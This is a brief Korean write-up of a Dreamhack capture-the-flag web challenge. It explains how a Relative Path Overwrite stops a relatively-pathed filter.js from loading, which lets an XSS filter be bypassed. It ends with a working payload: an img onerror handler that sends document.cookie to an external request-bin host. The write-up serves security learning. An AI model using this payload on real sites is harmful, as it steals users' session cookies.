## 풀이

vuln.php에 xss를 입력하여 쿠키를 탈취하는 문제인데,
filter.js가 걸려있어서 필터링 때문에 원활한 XSS 공격이 불가능하다.
이때 filter.js가 상대 경로로 지정되어 있는 것을 알 수 있는데,
이와 같이 상대 경로로 지정된 스크립트 파일은 base 주소를 변경하여 못 불러오도록 할 수 있다.

guest-book-v2의 DOM Clobbering 마지막 단계와 비슷한 방법의 우회기법을 활용한 것이다.
이를 Relative Path Overwrite라고 한다.

예를 들어

http://domain.com/?page=vuln&param=hi

라고 가정했을 때, vuln 페이지에서 filter.js를 불러온다고 해보자.
이때 http://domain.com/index.php/?page=vuln&param=hi
와 같은 식으로 요청을 보내면,

filter.js를 불러오는 주소가

http://host1.dreamhack.games:24126/filter.js

원래 이거여야 하는데,

http://host1.dreamhack.games:24126/index.php/filter.js

이쪽으로 요청을 보내게 된다.

filter.js는 / 경로에 있기 때문에 index.php/filter.js는 가져올 수 없게 된다.
이를 통해 filter.js를 문 밖에 가둬놓고 우회하여 XSS를 실행시킬 수 있다.

```html
index.php/?page=vuln&param=<img src=abc.jpg onerror=location.href="https://ppccuqa.request.dreamhack.games/"%2bdocument.cookie>
```